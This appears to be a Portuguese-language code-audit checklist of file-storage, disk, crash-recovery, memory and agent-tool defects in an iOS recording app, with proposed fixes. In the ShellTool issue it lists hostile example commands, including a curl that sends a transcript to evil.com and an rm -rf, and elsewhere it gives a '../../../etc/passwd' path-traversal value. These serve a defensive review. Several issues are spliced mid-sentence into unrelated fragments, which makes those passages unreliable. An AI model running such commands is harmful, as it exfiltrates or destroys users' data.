## A — File Storage & Directory Architecture

- [ ] **[#1] [P0] `FileArtifactStore` baseURL usa fallback frágil para `.cachesDirectory` quando `.applicationSupportDirectory` está indisponível — mas NUNCA loga que está a usar o fallback em produção.** `FileArtifactStore.swift:33-39` tem um `guard let appSupport = fileManager.urls(for: .applicationSupportDirectory, in: .userDomainMask).first` com fallback para `.cachesDirectory`. O `.applicationSupportDirectory` é o local correto para dados persistentes do utilizador (áudio, transcrições, análises). O `.cachesDirectory` é limpo pelo sistema em condições de low storage SEM aviso — todos os ficheiros desaparecem permanentemente. **Problemas:** (a) O fallback é silent após o log inicial no `init()` — se a app for relançada meses depois e o `applicationSupportDirectory` estiver indisponível por razões de sandbox (ex: restore de backup parcial, file protection incompleta), todos os `KnowledgeItem` do SwiftData apontam para paths sob `applicationSupportDirectory` que já não correspondem ao `baseURL` atual. O SwiftData diz que o item existe, mas o `FileArtifactStore` procura em `.cachesDirectory` e retorna `fileNotFound`. O item aparece na UI mas transcrições/análises/áudio estão "desaparecidos" — sem erro visível para o utilizador além de conteúdo vazio. (b) O `applyBaseProtection()` usa `try?` — se `createDirectory` falha (ex: disco cheio, permissões), o init termina sem base directory, e todas as operações subsequentes (`createMeetingDirectory`, `writeArtifact`) vão falhar com errors genéricos de FileManager. O `try?` engole a causa raiz. (c) O baseURL é `.../Application Support/Meetings/` mas as subpastas usam `items/<uuid>/` — não há migração do layout antigo (`<uuid>/` diretamente sob `Meetings/`). Se uma versão anterior da app escreveu ficheiros no layout antigo, ficam órfãos e inacessíveis. (d) O fallback cria uma situação de "split brain" onde metade dos artefactos está em `Application Support` e metade em `Caches` — sem reconciliação possível. **Correção:** `init()` deve (1) validar que consegue escrever no baseURL escolhido com um ficheiro sentinela `.wawa-store-check`, (2) emitir `.critical` se usar fallback para caches E persistir essa escolha em `UserDefaults` para que reinícios futuros sejam consistentes, (3) oferecer ao utilizador uma opção "Repair File Store" que reconcilia paths entre SwiftData e filesystem.

## K — Disk Space Management

- [ ] **[#2] [P0] `AudioFileWriter` faz retry de escrita com `Thread.sleep` na serial queue — sem deteção proativa de disco cheio e com bloqueio total da pipeline de áudio durante os sleeps.** `AudioFileWriter.swift:124-147` — o método `write(samples:frameLength:format:)` faz `queue.async` para a serial queue `"com.wawa-note.audio.filewriter"` e tem um retry loop de 4 tentativas com `Thread.sleep(forTimeInterval:)` de 0.1, 0.2, 0.4 segundos (total: 0.7s de bloqueio por write que falha). O problema fundamental é arquitectural: (a) O `Thread.sleep` é chamado DENTRO da serial queue — durante o sleep, NENHUMA outra operação de escrita pode ocorrer. Os buffers de áudio da tap callback (~23ms por buffer a 44.1kHz) continuam a chegar e são encaminhados para `queue.async` — acumulam-se na queue sem serem processados. Após 0.7s de sleep, ~30 buffers estão em fila. Quando o retry finalmente falha (tentativa 4), o `onWriteFailure` é invocado mas a queue JÁ está inundada de buffers pendentes. (b) O `AudioFileWriterError.diskFull` é um caso do enum definido na linha 8 mas NUNCA é lançado — o erro real do `AVAudioFile.write(from:)` quando o disco está cheio é um `NSError` do domain `AVFoundation` com código genérico. O retry loop trata todos os erros da mesma forma (sleep → retry), sem distinguir entre erro transiente (ex: file handle temporariamente ocupado pelo sistema) e erro permanente (disco cheio). Um disco cheio não se resolve com retry — cada retry consome tempo e energia sem possibilidade de sucesso. (c) Não existe verificação proativa de espaço em disco ANTES de iniciar a gravação. O `AudioCaptureService.startRecording()` só verifica `availableDiskSpace` (linha ~377) com um threshold hardcoded de 50MB — mas uma gravação PCM WAV de 2h a 44.1kHz consome ~318MB. Se o utilizador tem 100MB livres, a verificação passa mas o disco enche a meio da gravação. (d) O `write(buffer:)` (linha 152) duplica a mesma lógica de retry com `Thread.sleep` — duas cópias idênticas do mesmo bug. Se o comportamento de retry precisar de ser ajustado, são dois sítios para corrigir. (e) Quando `onWriteFailure` é chamado após 4 falhas, o `AudioCaptureService` reage com `forceFinish()` que chama `fileWriter.finishRecording()` — mas `finishRecording()` faz `queue.sync`, que fica bloqueado atrás de todos os buffers pendentes na queue. Se a serial queue tem 30 writes pendentes, `finishRecording()` pode demorar 30 × 0.7s = 21 segundos. O utilizador vê a UI congelada e pode fazer force-quit, corrompendo o ficheiro WAV final. **Correção:** (1) Verificação proativa: `FileManager.default.volumeAvailableCapacity(forImportantUsage:)` antes de iniciar gravação, com threshold dinâmico baseado no sample rate × duração estimada. (2) Distinção de erros no retry: usar `NSError.isDiskFull` (verificar `NSCocoaErrorDomain` + `NSFileWriteOutOfSpaceError`) para abortar imediatamente sem retry. (3) Substituir `Thread.sleep` por `queue.asyncAfter` para não bloquear a serial queue — ou melhor ainda, usar um contador de "writes pendentes" e rejeitar novas writes quando > N. (4) `finishRecording()` deve usar `queue.async` com callback em vez de `queue.sync`. (5) Extrair a lógica de retry para um único método privado `_writeWithRetry(buffer: AVAudioPCMBuffer)` usado por ambos.

- [ ] **[#24] [P2] Fugas de espaço em disco por acumulação gradual de ficheiros órfãos — PCM temporários, segmentos não limpos, exports nunca apagados, logs rotated — sem sweep automático.** Ao longo de semanas de uso, o espaço em disco degrada-se devido a: (a) PCM temporários em `/tmp/pcm_*.wav` (230MB cada) nunca limpos se transcrição falha. (b) Segmentos WAV em `items/<uuid>/segments/` nunca apagados após concatenação bem-sucedida (duplicação de 318MB/gravação). (c) **Inconsistência áudio vs texto.** O utilizador espera que "Import" signifique "trazer o ficheiro para dentro do app". Para áudio isso acontece — o ficheiro é copiado e está disponível para playback. (2) Todos os `FormatImporter.importFromURL()` devem popular `artifacts` com o URL do ficheiro copiado. (3) `ImportFormView.performTextImport()` deve chamar `cleanupSourceFiles()` após o import bem-sucedido. (4) A UI de detail deve permitir abrir/visualizar o ficheiro original importado (PDF → PDFView, imagem → QuickLook, etc.). ## J — Crash Recovery & File Integrity

- [ ] **[#4] [P0] `RecordingManifest` é a single source of truth para todos os segmentos de áudio, mas é escrito com `try?` silencioso e sem backup — um crash no momento errado corrompe o JSON e invalida TODA a gravação mesmo com segmentos WAV intactos no disco.** O manifesto (`recording.manifest.json`) é escrito em 5 pontos diferentes do `RecordingCoordinator`: `saveManifest` (linha 361-363) após cada segmento, após concatenação, e no stop. **Problemas:** (a) **`try?` engole falhas de escrita.** `saveManifest` faz `try? store.writeRecordingManifest(manifest, for: meetingId)` — se o disco está cheio, o ficheiro está locked, ou o JSONEncoder falha (ex: dados não-encodáveis no manifesto), o erro é descartado silenciosamente. O manifesto em disco fica stale (versão anterior) e o coordinator continua como se tudo estivesse bem. Na próxima leitura (`readRecordingManifest`), o manifesto reflete um estado antigo — segmentos gravados após o write falhado são invisíveis ao manifesto. O `hasValidAudioData()` (no `debugRecordingArtifacts`) confia cegamente nos metadados do manifesto para validar segmentos — se o manifesto diz que um segmento não tem `fileSize`, o segmento é considerado inválido mesmo que o ficheiro WAV esteja perfeito no disco. (b) **`.atomicWrite` não é verdadeiramente atómico em iOS.** `Data.write(to:options:.atomicWrite)` escreve para um ficheiro temporário e depois chama `rename()`. Se o dispositivo crasha ENTRE o `rename()` e a confirmação do filesystem (APFS é copy-on-write, mas metadata journal pode não ter flush), o ficheiro original e o temporário podem ambos estar corrompidos. Não há fsync, não há `F_BARRIERFSYNC`. O manifesto deveria ter rotação: escrever para `recording.manifest.json.NEW`, verificar integridade do JSON (deserializar para validar), e só depois renomear sobre o original. Se o novo está corrompido, o antigo ainda é válido. (c) **`readRecordingManifest` usa `try` sem fallback.** `FileArtifactStore.swift:146-150` chama `try JSONDecoder().decode(...)` — se o JSON está truncado (crash mid-write), o decoder lança exceção. Mas `debugRecordingArtifacts` (linha 174) usa `try?` e loga "manifestExists: true" sem indicar que o JSON está corrompido. Outros callers que usam `try` diretamente crasham. (d) **Sem checksum ou hash do ficheiro.** Não há como verificar se o manifesto foi corrompido silenciosamente (bit rot, falha de storage). Um hash SHA-256 armazenado junto ao manifesto permitiria deteção de corrupção. (e) **`recordingManifestExists` retorna true para ficheiro de 0 bytes.** Se o disco encheu durante o `.atomicWrite`, o ficheiro temporário foi criado (0 bytes) e renomeado sobre o original — `fileExists` retorna true, mas `JSONDecoder` crasha ao ler 0 bytes. (f) **Manifesto e segmentos WAV estão em diretórios diferentes.** Segmentos estão em `items/<uuid>/segments/segment-NNN.wav` enquanto o manifesto está em `items/<uuid>/recording.manifest.json`. Se o diretório `segments/` é perdido (ex: limpeza parcial do sistema, bug de FileManager), o manifesto fica intacto mas aponta para ficheiros inexistentes — `hasValidAudioData` reporta "0 valid segments" mas não consegue distinguir entre "segmentos nunca gravados" e "segmentos perdidos do disco". **Correção:** (1) Substituir `try?` em `saveManifest` por `try` com propagação de erro até ao coordinator, que deve fazer retry e, em caso de falha permanente, mostrar alerta ao utilizador. (2) Write com rotação: `manifest.json.NEW` → validar JSON → `rename()` sobre `manifest.json` → guardar `manifest.json.BAK` como backup da versão anterior. (3) `readRecordingManifest` deve retornar `nil` em vez de lançar — e todos os callers devem tratar `nil` como "manifesto ilegível, validar segmentos diretamente do disco". (4) Adicionar `manifestSHA256` ao manifesto e validar na leitura. (5) `hasValidAudioData` deve fazer fallback para listagem direta do diretório `segments/` quando o manifesto está ausente ou corrompido. (6) `recordingManifestExists` deve verificar `fileSize > 0` antes de retornar true.

- [ ] **[#22] [P0] Crash checkpoint (`recording_checkpoint.json`) é escrito a cada 5s mas NUNCA usado para recuperar a gravação — o `loadCrashCheckpoint` descarta checkpoints >24h e o `cleanupOrphanedRecordings` só marca itens como `.recorded` sem reabrir o ficheiro para continuar a escrever.** `AudioFileWriter.writeCheckpoint()` (linha 192-207) grava `meetingId`, `segmentIndex`, `sampleRate`, `channels`, `timestamp`, `fileName` em `configs/recording_checkpoint.json` via `queue.async` com `try?`. O `loadCrashCheckpoint()` (linha 211-223) lê o checkpoint e verifica `Date().timeIntervalSince1970 - timestamp < 86400`. **Problemas:** (a) **Checkpoint NUNCA usado para recovery real.** O `RecordingCoordinator.cleanupOrphanedRecordings()` (chamado no `WawaNoteApp.init()` após crash) itera sobre `KnowledgeItem` com `status == .recording` e marca-os como `.recorded` ou `.failed` — mas NUNCA chama `loadCrashCheckpoint()` para obter o `segmentIndex` e `sampleRate` e reabrir o `AudioFileWriter` para continuar a escrever no mesmo ficheiro. O checkpoint é lido apenas para logging. (b) **Expiração de 24h é arbitrária e perigosa.** Se o utilizador grava às 23:30, o app crasha, e o utilizador abre o app às 00:15 do dia seguinte → 45 minutos depois, mas o checkpoint é rejeitado porque `timestamp` é de "ontem" (>24h atrás devido à mudança de dia? Não, 45min < 24h). Mas se o crash ocorreu durante uma pausa longa (ex: utilizador pausou, foi dormir, o sistema matou o app durante a noite), o checkpoint tem 8h — ainda <24h, ainda válido. O problema real é o oposto: um checkpoint de 23h é aceite mas o ficheiro WAV do segmento já foi truncado pelo sistema ou está num estado irrecoverável. (c) **Timestamp vulnerável a mudanças de relógio.** O `timestamp` usa `Date().timeIntervalSince1970` — se o utilizador muda o fuso horário ou o sistema ajusta o relógio via NTP, o timestamp não reflete o tempo real decorrido. (d) **Checkpoint sobrescrito a cada 5s sem backup.** Se o disco está cheio e `try? data.write(to:)` falha, o checkpoint anterior (válido) permanece — boa proteção. Mas se o write é parcial (crash mid-write), o ficheiro anterior JÁ foi truncado pelo `.atomic` write (temp file renomeado sobre o original) — o checkpoint fica corrompido. (e) **FileName no checkpoint é `_currentFileURL?.lastPathComponent ?? (2) Além do checkpoint 5s, escrever checkpoint de emergência no `applicationWillTerminate` e `applicationDidEnterBackground`. (3) Checkpoint com rotação: `recording_checkpoint.json.NEW` → validar → rename, mantendo `recording_checkpoint.json.BAK`. (4) Incluir snapshot completo do manifesto no checkpoint para reconstrução total. (5) Reduzir expiração para 1h — se o checkpoint tem >1h, o segmento WAV provavelmente já não é recuperável.

## I — AI-Generated Files

- [ ] **[#5] [P0] `WriteAnalysisTool` — o agente AI escreve ficheiros diretamente no filesystem sem sandbox, sem validação de que o `itemId` existe, sem backup da análise anterior, e sem limite de tamanho.** `WriteAnalysisTool.swift:32-79` é invocado pelo agente LLM durante o pipeline de análise. O agente passa um `itemId` (string) e `analysisJson` (string JSON). O tool: (1) faz `JSONSerialization.jsonObject` para validar que é JSON, (2) cria o diretório via `createMeetingDirectory`, (3) escreve `analysis.json` com `.atomic`. **Problemas:** (a) **Sem validação de que o item existe.** O agente pode alucinar um `itemId` (ex: confundir IDs, gerar UUID aleatório). O tool cria o diretório `items/<uuid-falso>/` e escreve `analysis.json` lá — criando um diretório órfão que nunca será associado a nenhum `KnowledgeItem`. O SwiftData não sabe que este ficheiro existe, e o `FileArtifactStore` não tem método para listar diretórios órfãos. Acumulam-se para sempre. (b) **Sobrescrita silenciosa da análise anterior.** Se o agente é re-executado (ex: `reprocessItem()` da UI), o `analysis.json` anterior é substituído sem backup. Se a nova análise é pior ou está incompleta (ex: agente falhou a meio, JSON parcial), a análise anterior — potencialmente boa — é perdida para sempre. Não há `analysis.json.BAK`, não há versionamento. (c) **Sem limite de tamanho do ficheiro.** O agente pode escrever JSON arbitrariamente grande. Se o LLM alucina ou entra em loop de autorepetição (ex: repete o mesmo parágrafo 1000x), o ficheiro pode crescer para centenas de MB. Não há `maxFileSize`, não há truncagem. (d) **Bypass ao `FileArtifactStore.writeArtifact()`.** O tool escreve diretamente com `prettyData.write(to: url, options: .atomic)` em vez de usar `fileStore.writeArtifact(json, fileName: "analysis.json", meetingId: itemId)`. Isto significa que: não há logging centralizado de escritas de artefactos, não há `FileArtifactStoreError` adequado (o catch genérico devolve `error.localizedDescription`), e qualquer melhoria futura no `writeArtifact` (ex: checksum, backup, validação) não beneficia o `WriteAnalysisTool`. (e) **Tool não é o único a escrever analysis.** O `ContentPipelineService` também escreve `analysis.json` via o mesmo path. Duas fontes de verdade competem pela escrita do mesmo ficheiro — se o pipeline escreve enquanto o agente está a re-analisar, race condition. (f) **Lock file ausente.** Não há mecanismo para impedir que dois agentes (ou o mesmo agente em iterações diferentes) escrevam simultaneamente no mesmo `analysis.json`. Se o AgentLoop corre em paralelo para dois items diferentes, dois `WriteAnalysisTool.execute()` podem colidir — um escreve, o outro sobrescreve. (g) **Path injection via itemId.** O `itemIdStr` é concatenado diretamente no path via `itemDirectoryURL(for: itemId)` — se o LLM gerar `"../../../etc/passwd"` como itemId, o `UUID(uuidString:)` retorna nil e o tool rejeita. Mas se um futuro tool usar diretamente um path fornecido pelo agente, há risco de path traversal. **Correção:** (1) Validar `itemId` contra SwiftData ANTES de criar diretório — `guard let item = modelContext.fetch(KnowledgeItem.self, predicate: #Predicate { $0.id == itemId }) else { return error }`. (2) Fazer backup da análise anterior: renomear `analysis.json` → `analysis.json.BAK` antes de escrever a nova. (3) Impor `maxAnalysisSize` (ex: 1MB) — rejeitar JSON maior. (4) Usar `fileStore.writeArtifact()` como único ponto de escrita de artefactos, movendo a lógica de validação para lá. (5) Adicionar file lock com `DispatchQueue` serial por itemId ou `NSFileCoordinator`. (6) Adicionar metadata `writtenBy` e `agentIteration` ao JSON para rastrear proveniência da escrita.

- [ ] **[#23] [P0] `ShellTool` dá ao agente AI acesso total ao filesystem do app sem sandbox — pode ler, escrever, e apagar qualquer ficheiro dentro do container, incluindo SwiftData, Keychain, e ficheiros de sistema.** `ShellTool` (referenciado em `ContentPipelineService` como tool registada) permite ao LLM executar comandos shell arbitrários. **Problemas:** (a) **Acesso irrestrito ao filesystem.** O agente pode executar `rm -rf items/`, `cat /etc/hosts`, `find / -name "*.db"`, `curl http://evil.com -d @transcript.json`. (b) **Sem auditoria do que o agente faz ao filesystem.** Comandos shell executados não são logados com o output completo — se o agente apaga `analysis.json` e escreve um novo, o `FileLogService` não regista a operação. ## L — Memory Management During File Ops

- [ ] **[#7] [P0] `prepareForRecognition` aloca o ficheiro de áudio INTEIRO em RAM duas vezes (input buffer + output buffer) — uma gravação de 2h a 44.1kHz consome ~1.5GB de memória e causa crash por OOM.** `AppleSpeechTranscriptionEngine.swift:421-480` — o método `prepareForRecognition(_:)` decodifica AAC/M4A para PCM WAV 16kHz mono porque `SFSpeechRecognizer` perde sincronização com bitstreams AAC (gaps de 40-90s). O algoritmo: (1) abre `AVAudioFile(forReading:)` no ficheiro de input, (2) lê `inputFile.length` (TOTAL de frames), (3) aloca `AVAudioPCMBuffer(pcmFormat: inputFormat, frameCapacity: inputLength)` — um buffer único com o ficheiro COMPLETO, (4) aloca output buffer com `outputCapacity = inputFrameLength × (outputSampleRate / inputSampleRate)`, (5) converte via `AVAudioConverter.convert(to:error:withInputFrom:)`. **Problemas:** (a) **Alocação monobloco sem streaming.** O `AVAudioFile.read(into:)` lê o ficheiro inteiro para um único `AVAudioPCMBuffer`. Para um ficheiro AAC de 2h a 44.1kHz stereo: input buffer = 2h × 3600s × 44100 frames/s × 2 channels × 4 bytes (float32) = **~2.54 GB**. O output buffer = 2h × 3600s × 16000 frames/s × 1 channel × 2 bytes (int16) = **~230 MB**. Total simultâneo: **~2.77 GB**. O iPhone 14 Plus tem 6GB RAM — com o sistema iOS a consumir ~2-3GB, esta alocação estoura o limite e causa termination pelo jetsam. (b) **A alocação falha silenciosamente em low memory.** Se `AVAudioPCMBuffer(pcmFormat:frameCapacity:)` retorna nil (linha 453), o método lança `TranscriptionError.recognitionFailed("Cannot allocate input buffer")` — mas o utilizador vê apenas "Transcription failed" sem indicação de que foi um problema de memória. Não há tentativa de chunked processing como fallback. (c) **O ficheiro PCM temporário também consome espaço em disco.** O output PCM WAV é escrito para `NSTemporaryDirectory()/pcm_<uuid>.wav` (linha 438) e NUNCA é limpo se a transcrição falha a meio. Para uma gravação de 2h: ~230MB de ficheiro temporário órfão. Se o utilizador tenta transcrever 3 gravações em sequência, ~700MB de ficheiros temporários acumulam-se em `/tmp`. (d) **Conversão desnecessária para ficheiros já PCM.** O guard `ext == "m4a" || ext == "mp4"` (linha 423) faz bypass para WAV — mas após a migração para PCM WAV nos segmentos (`AudioFileWriter._openSegment` já escreve WAV), o `audio.m4a` concatenado é M4A novamente. O pipeline faz: gravação PCM WAV → concatenação para M4A → `prepareForRecognition` converte M4A de volta para PCM WAV → `SFSpeechRecognizer` lê PCM WAV. Duas conversões desnecessárias: PCM→M4A (lossy) e M4A→PCM (memory-heavy). (e) **Sem `volumeAvailableCapacity` antes de escrever o ficheiro temporário.** O `tempURL` é criado em `/tmp` sem verificar espaço — se o disco está cheio, `AVAudioFile(forWriting:)` falha com erro genérico. (f) **`AVAudioConverter` não tem progress callback.** O `convert(to:error:withInputFrom:)` é síncrono e bloqueia a thread. Para ficheiros grandes (2h), pode demorar 30-60 segundos sem qualquer feedback de progresso. O utilizador vê a UI congelada. (g) **Não há cache do PCM convertido.** Se o mesmo ficheiro é transcrito 2x (ex: falha na primeira tentativa, retry), `prepareForRecognition` é chamado novamente, realocando os 2.7GB e reescrevendo o PCM temporário. O ficheiro temporário anterior foi perdido. **Correção:** (1) Chunked conversion: em vez de ler o ficheiro inteiro, fazer loop com `AVAudioFile.read(into:frameCount:)` em chunks de 5-10 segundos, convertendo incrementalmente e escrevendo no output. O `AVAudioConverter` suporta streaming — o callback pode retornar chunks sucessivos em vez do buffer inteiro. (2) Após conversão bem-sucedida, cache do ficheiro PCM em `items/<uuid>/pcm_16k.wav` para evitar reconversão. (3) Limpar ficheiros temporários no `defer` ou num cleanup sweep no arranque. (4) Verificar `os_proc_available_memory()` ou `phys_footprint` antes de alocar e fazer fallback para chunked se memória < 500MB. (5) Adicionar progress callback e expor na UI ("Preparing audio... 45%"). (6) Verificar `volumeAvailableCapacity` antes de escrever PCM temporário.

(e) **Sem validação de integridade do export.** Se o `MarkdownExporter` gera 200KB de markdown, não há verificação de que o ficheiro partilhado corresponde ao gerado (checksum). O `ShareLink` pode truncar ou corromper sem que o utilizador saiba. (g) **Project export omite ficheiros binários.** `ProjectExportService.exportMarkdown()` inclui texto dos items mas não inclui scanned pages, PDFs originais, ou áudio. O utilizador pensa que está a exportar o projeto completo mas os ficheiros binários ficam para trás. **Correção:** (1) Implementar `FormatExporter` protocolo (equivalente ao `FormatImporter`) com `func export(item:) -> Data` e `var exportedUTType: UTType`. ## V — Resiliency & Edge Cases

- [ ] **[#13] [P1] Nenhum dos 10 importers faz deteção de encoding — assumem UTF-8 cegamente e rejeitam silenciosamente ficheiros em UTF-16, ISO-8859-1, ou Windows-1252.** `JSONImporter.canRead(data:)` (linha 14) faz `String(data: data.prefix(100), encoding: .utf8)` — se o ficheiro JSON está em UTF-16 (com BOM) ou UTF-8 com BOM (EF BB BF), a string é nil e `canRead` retorna false. O utilizador vê "No importer found" sem qualquer indicação de que o problema é encoding. `RTFImporter.canRead(data:)` (linha 11) usa `.ascii` — RTF files em UTF-16 (comuns em documentos Microsoft Word exportados) são rejeitados. `ICSImporter.importFromURL()` (linha 21) faz `String(contentsOf: url, encoding: .utf8)` — ICS files de Outlook ou Google Calendar em ISO-8859-1 lançam exceção. O `PlainTextImporter` nem sequer verifica encoding. **Problemas:** (a) **Sem deteção automática de encoding.** Nenhum importer usa `NSString.stringEncoding(for:encodingOptions:convertedString:usedLossyConversion:)` ou `FileHandle` com BOM detection. Cada importer implementa a sua própria lógica ad-hoc de encoding. (b) **Sem feedback de erro específico.** Quando `canRead` retorna false por encoding, o erro é indistinguível de "formato não suportado". O utilizador não recebe sugestão de "Tente converter para UTF-8". (c) **`Data(contentsOf:)` usado em 8/10 importers sem opção de encoding.** `Data(contentsOf:)` lê o ficheiro como bytes brutos — correto. Mas o passo seguinte é sempre `String(data:encoding:)` com `.utf8` fixo. Nenhum importer tenta `.utf16`, `.isoLatin1`, ou `.windowsCP1252` como fallback. (d) **Ficheiros com BOM quebram o parsing.** Se um ficheiro começa com BOM UTF-8 (EF BB BF), `String(data:encoding:.utf8)` inclui o BOM invisível no início da string — o ICS importer procura `"BEGIN:VCALENDAR"` mas a string começa com `"\u{FEFF}BEGIN:VCALENDAR"` → linha ignorada, import produz item vazio. (e) **Ficheiros muito grandes carregados inteiros em memória.** `Data(contentsOf:)` e `String(contentsOf:encoding:)` carregam o ficheiro COMPLETO em RAM. Um CSV de 500MB ou um JSON de 200MB → OOM. Nenhum importer usa `InputStream` ou `FileHandle` para leitura chunked. (f) **Sem timeout no import.** `importFromURL` é `async` mas o trabalho pesado (`Data(contentsOf:)`, `NSAttributedString(data:...)`) é síncrono e bloqueia a thread cooperativa. Um RTF complexo com imagens embedded pode demorar >30s a processar — sem progresso, sem cancelamento. (g) **Path traversal não validado.** Nenhum importer valida que o `url` está dentro do sandbox antes de o abrir — se um URL malicioso é passado (ex: symlink para fora do container), o importer lê ficheiros fora do sandbox. (h) **Ficheiros zero-byte não são tratados.** Se o utilizador importa um ficheiro de 0 bytes, `Data(contentsOf:)` retorna Data vazio — os importers tentam fazer parse e produzem itens vazios (título "Untitled", sem body) sem warning. **Correção:** (1) Adicionar `FileEncodingDetector` que usa `String.EncodingDetection` com fallback chain: UTF-8 → UTF-16 → ISO-8859-1 → Windows-1252 → MacRoman. (2) `FormatImporter.canRead` deve receber encoding detectado como parâmetro adicional. (3) Adicionar `ImportError.encodingNotSupported(detected: String.Encoding)` com sugestão de conversão na UI. (4) Strip BOM antes de parsing: `if data.prefix(3) == Data([0xEF, 0xBB, 0xBF]) { data = data.dropFirst(3) }`. (5) Para ficheiros >10MB, usar `InputStream` com buffer chunked de 64KB em vez de `Data(contentsOf:)`. (6) Adicionar `importProgress` callback no `FormatImporter` protocol. (7) Validar que o URL está dentro do sandbox com `url.standardized.path.hasPrefix(baseURL.path)`. (8) Detetar ficheiro zero-byte e retornar `ImportError.emptyFile` com warning na UI.

## X — Apple Best Practices

- [ ] **[#14] [P0] Ficheiros de áudio (PCM WAV até 318MB/hora) e artefactos não têm `isExcludedFromBackup` — gravados em `.applicationSupportDirectory`, são incluídos no backup iCloud e podem causar rejeição na App Store.** A Apple requer que dados regeneráveis ou descarregáveis sejam excluídos do backup iCloud (`NSURLIsExcludedFromBackupKey`). Gravações de áudio, transcrições, análises e embeddings são regeneráveis (o utilizador pode regravar/reanalisar) e grandes (gravação de 2h = ~318MB). Sem `isExcludedFromBackup`, 10 gravações consomem 3GB do iCloud do utilizador. **Problemas:** (a) **Violação da iOS Data Storage Guidelines.** A Apple rejeita apps que armazenam dados não-críticos em locais backed up sem exclusão explícita. `FileArtifactStore` escreve para `.applicationSupportDirectory` sem nunca chamar `url.setResourceValues([.isExcludedFromBackupKey: true])`. (b) **`FileProtectionType.completeUnlessOpen` é aplicado com `try?`.** Se a proteção de ficheiro falha (ex: permissões, disco cheio), áudio e transcrições ficam sem encriptação at-rest — viola a expectativa de privacidade do utilizador. O `try?` na linha 49 e 87-90 silencia a falha. (c) **Sem `NSFileCoordinator` para operações multi-thread.** `AudioFileWriter` escreve numa serial queue, `AudioSegmentConcatenator` lê segmentos, `ContentPipelineService` lê `audio.m4a`, e `FileArtifactStore` escreve artefactos — tudo no mesmo diretório `items/<uuid>/` sem coordenação. (d) **Ficheiros de log em `.cachesDirectory` estão corretos, mas o `FileLogService` não usa `URLResourceValues` para verificar espaço antes de escrever.** Se o sistema está a purgar caches por low storage, escrever no log pode acelerar a purga ou falhar. (e) **Sem `UIApplication.beginBackgroundTask` para operações de ficheiro longas.** `prepareForRecognition` (conversão AAC→PCM), `AudioSegmentConcatenator.concatenate` (export AVAsset), e `ContentPipelineService.process` (transcrição + análise) podem demorar minutos. Se o utilizador sai do app, estas operações são suspensas sem `beginBackgroundTask` — ficheiros temporários ficam truncados. (f) **Sem `FileManager.volumeAvailableCapacity(forImportantUsage:)` usado consistentemente.** Só `AudioCaptureService` verifica espaço (threshold fixo de 50MB). `AudioSegmentConcatenator`, `prepareForRecognition`, `FileArtifactStore.writeArtifact`, e todos os importers escrevem sem verificar espaço. (g) **Sem suporte a `NSFileProtection` diferencial.** `completeUnlessOpen` é aplicado ao diretório base e aos meeting directories — mas ficheiros individuais (segmentos WAV, analysis JSON) herdam a proteção do diretório. Se um ficheiro é criado antes de `setAttributes` ser chamado no diretório, fica sem proteção. (h) **Ficheiros no `NSTemporaryDirectory` (PCM temporário, exports) não são limpos no `applicationWillTerminate`.** O sistema limpa `/tmp` eventualmente, mas ficheiros de 230MB acumulados entre sessões consomem espaço que podia ser usado para gravações. **Correção:** (1) Aplicar `isExcludedFromBackup: true` a TODOS os ficheiros e diretórios criados pelo `FileArtifactStore` — áudio, transcrições, análises, embeddings, segmentos. (2) Substituir `try?` por `try` com logging de erro em `setAttributes(.protectionKey)`. Se falhar, fazer retry em background. (3) Usar `NSFileCoordinator` com `NSFilePresenter` para coordenar acesso de leitura/escrita a ficheiros partilhados (segmentos, audio.m4a, manifest). (4) Implementar `FileOperationBackgroundTask` que chama `UIApplication.shared.beginBackgroundTask(expirationHandler:)` antes de operações longas. (5) Adicionar verificação `volumeAvailableCapacity` como guarda em TODOS os métodos de escrita do `FileArtifactStore`. (6) Aplicar `FileProtectionType.completeUnlessOpen` ANTES de criar subficheiros — garantir que o diretório está protegido primeiro. (7) Limpar `NSTemporaryDirectory` de ficheiros `pcm_*.wav` e `wawa-debug-*.log` no `applicationDidFinishLaunching`. (8) Considerar usar `.applicationSupportDirectory` + `isExcludedFromBackup` como padrão, ou migrar áudio para um diretório dedicado não-backed-up.

## N — Multi-Project File Management

- [ ] **[#15] [P1] Ficheiros de items são organizados por `itemID` em `items/<uuid>/` mas projetos não têm diretório próprio — apagar um projeto não limpa ficheiros, não há tracking de espaço por projeto, e `configs/` é global sem isolamento.** O `FileArtifactStore` organiza todos os artefactos (áudio, transcrições, análises, segmentos, scans) sob `items/<uuid>/`. (4) `configsDirectoryURL()` deve ser complementado com `projectConfigsDirectoryURL(projectId:)`. (5) `exportSingleProject` deve opcionalmente incluir ficheiros binários como base64 ou zip bundle. (6) `ProjectService.mergeProjects(source:target:)` deve re-atribuir `projectID` em SwiftData e opcionalmente recriar `isExcludedFromBackup` flags. (7) Adicionar `ProjectService.archiveProject(projectId:)` que cria `projects/<projectId>.wawarchive` (zip com SwiftData JSON + ficheiros) e remove do armazenamento ativo.

## W — Simplicity & Code Quality

- [ ] **[#16] [P1] Operações de ficheiro estão espalhadas por 7+ classes sem abstração comum — `deleteItem` duplicado no `RecordingCoordinator` e `KnowledgeItemService` com ordens opostas, retry de escrita copiado em 2 métodos do `AudioFileWriter`, `writeArtifact` bypassed pelo `WriteAnalysisTool`.** O file management no codebase sofre de falta de um `FileOperationService` unificado. Os serviços de file management são classes concretas acopladas diretamente. **Correção:** (1) Criar `FileOperationService` como único ponto de entrada para TODAS as operações de ficheiro, com logging, retry, e validação centralizados. (2) Mover lógica de retry para `FileOperationService.writeWithRetry(data:url:maxAttempts:backoff:)` e usar em `AudioFileWriter`, `writeArtifact`, `writeCheckpoint`. ## M — Interruptions During File Ops

- [ ] **[#18] [P1] Nenhuma operação de ficheiro longa regista `UIApplication.beginBackgroundTask` — se o utilizador sai do app durante concatenação, conversão PCM, export, ou pipeline, os ficheiros ficam truncados sem retry.** Operações de ficheiro potencialmente longas incluem: `AudioSegmentConcatenator.concatenate()` (export `AVAssetExportSession` pode demorar 2-5 min), `prepareForRecognition()` (conversão AAC→PCM pode demorar 1-3 min para 2h de áudio), `ContentPipelineService.process()` (transcrição + análise pode demorar 5-15 min), `AudioImportService.convertToAAC()` (conversão ExtAudioFile pode demorar 5 min), `InstanceExportService.exportComplete()` (JSON encode de 50+ projetos pode demorar 30s). Nenhuma destas operações regista `UIApplication.shared.beginBackgroundTask(expirationHandler:)`. **Problemas:** (a) **Suspensão a meio da escrita causa ficheiros truncados.** Se o `AVAssetExportSession` está a 90% do export e o utilizador faz swipe para home, o sistema suspende o app — o ficheiro `audio.m4a` fica truncado (90% completo, inválido). Quando o app volta, o coordinator já fez `saveManifest` e apontou `audioFileRelativePath` para o 